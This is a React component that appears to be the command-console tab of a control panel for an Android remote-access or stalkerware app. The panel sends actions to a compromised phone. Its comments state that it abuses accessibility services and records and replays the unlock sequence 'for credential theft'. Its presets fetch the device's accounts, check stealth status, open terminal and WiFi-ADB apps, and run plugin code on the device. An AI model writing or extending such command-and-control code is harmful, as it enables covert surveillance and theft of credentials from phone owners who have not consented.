import { useState, useRef, useEffect } from 'react';
import { api } from '../../lib/api';
import { C } from './shared';

// No SHELL command exists in the APK source.
// This tab implements accessibility-based command execution via:
//   1. OPEN_APP + TYPE to run commands via a terminal app
//   2. EXEC_PLUGIN for plugin-based code execution
//   3. START_UNLOCK_RECORDING / PLAY_UNLOCK_SEQUENCE for credential theft

const PRESETS = [
  { label: 'Accessibility Check', action: 'CHECK_ADMIN_STATUS', params: {} },
  { label: 'Get Accounts',        action: 'GET_ACCOUNTS',       params: {} },
  { label: 'Stealth Status',      action: 'STEALTH_STATUS',     params: {} },
  { label: 'Open Terminal',       action: 'OPEN_APP', params: { package: 'jackpal.androidterm' } },
  { label: 'Open ADB WiFi App',   action: 'OPEN_APP', params: { package: 'com.ttxapps.wifiadb' } },
  { label: 'List Plugins',        action: 'LIST_PLUGINS',       params: {} },
  { label: 'Ping',                action: 'PING',                params: {} },
];

export default function ShellTab({ device }) {
  const [hist, setHist] = useState([{
    type: 'info',
    text: 'No native shell in APK. Use presets or custom EXEC_PLUGIN commands.',
  }]);
  const [action,  setAction]  = useState('');
  const [paramsJ, setParamsJ] = useState('{}');
  const [running, setRunning] = useState(false);
  const endRef = useRef(null);

  useEffect(() => { endRef.current?.scrollIntoView({ behavior: 'smooth' }); }, [hist]);

  async function run(e) {
    e.preventDefault();
    const a = action.trim().toUpperCase();
    if (!a || running) return;

    let p = {};
    try { p = JSON.parse(paramsJ || '{}'); } catch { setHist(h => [...h, { type: 'err', text: 'Invalid JSON params' }]); return; }

    setHist(h => [...h, { type: 'cmd', text: `${a} ${JSON.stringify(p)}` }]);
    setRunning(true);
    try {
      const r = await api.sendCommand(device.id, a, p);
      setHist(h => [...h, { type: 'ok', text: `→ ${r.status} (${r.cmdId?.slice(0, 8)})` }]);
    } catch (err) {
      setHist(h => [...h, { type: 'err', text: err.message }]);
    } finally { setRunning(false); }
  }

  async function runPreset(preset) {
    setHist(h => [...h, { type: 'cmd', text: `${preset.action} ${JSON.stringify(preset.params)}` }]);
    setRunning(true);
    try {
      const r = await api.sendCommand(device.id, preset.action, preset.params);
      setHist(h => [...h, { type: 'ok', text: `→ ${r.status}` }]);
    } catch (err) {
      setHist(h => [...h, { type: 'err', text: err.message }]);
    } finally { setRunning(false); }
  }

  const colors = { cmd: C.green, ok: '#00d26a88', err: C.red, info: '#444' };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
      {/* Presets */}
      <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8 }}>
        {PRESETS.map(p => (
          <button key={p.label} onClick={() => runPreset(p)} disabled={running}
            style={{ padding: '6px 12px', background: 'none', border: `1px solid ${C.border}`,
              borderRadius: 5, color: '#888', fontSize: 12, cursor: 'pointer', fontFamily: 'inherit' }}>
            {p.label}
          </button>
        ))}
      </div>

      {/* Output */}
      <div style={{ background: '#060609', border: `1px solid ${C.border}`, borderRadius: 7,
        fontFamily: 'monospace', fontSize: 12, display: 'flex', flexDirection: 'column' }}>
        <div style={{ padding: '7px 14px', borderBottom: `1px solid ${C.border}`,
          fontSize: 11, color: '#444', display: 'flex', justifyContent: 'space-between' }}>
          <span>Command Console · {device.model || device.id.slice(0, 12)}</span>
          <button onClick={() => setHist([])}
            style={{ background: 'none', border: 'none', color: '#444', cursor: 'pointer', fontSize: 11, fontFamily: 'inherit' }}>
            Clear
          </button>
        </div>
        <div style={{ padding: '10px 14px', overflowY: 'auto', maxHeight: 320,
          display: 'flex', flexDirection: 'column', gap: 3 }}>
          {hist.map((h, i) => (
            <div key={i} style={{ color: colors[h.type] || C.text }}>
              {h.type === 'cmd' ? '⟩ ' : '  '}{h.text}
            </div>
          ))}
          {running && <div style={{ color: C.dim }}>executing…</div>}
          <div ref={endRef} />
        </div>

        {/* Custom command input */}
        <form onSubmit={run} style={{ borderTop: `1px solid ${C.border}` }}>
          <div style={{ display: 'flex', gap: 6, padding: '8px 12px' }}>
            <input value={action} onChange={e => setAction(e.target.value)}
              placeholder="ACTION" disabled={running} spellCheck={false}
              style={{ width: 180, padding: '7px 10px', background: '#0a0a0f',
                border: `1px solid ${C.border}`, borderRadius: 5, color: C.green,
                fontSize: 12, outline: 'none', fontFamily: 'monospace', flexShrink: 0 }} />
            <input value={paramsJ} onChange={e => setParamsJ(e.target.value)}
              placeholder='{"key":"value"}' disabled={running} spellCheck={false}
              style={{ flex: 1, padding: '7px 10px', background: '#0a0a0f',
                border: `1px solid ${C.border}`, borderRadius: 5, color: C.text,
                fontSize: 12, outline: 'none', fontFamily: 'monospace' }} />
            <button type="submit" disabled={running || !action.trim()}
              style={{ padding: '7px 14px', background: running ? '#0d3a20' : '#00613a',
                border: 'none', borderRadius: 5, color: '#fff', fontSize: 12,
                cursor: running ? 'wait' : 'pointer', flexShrink: 0, fontFamily: 'inherit' }}>
              {running ? '…' : 'Send'}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
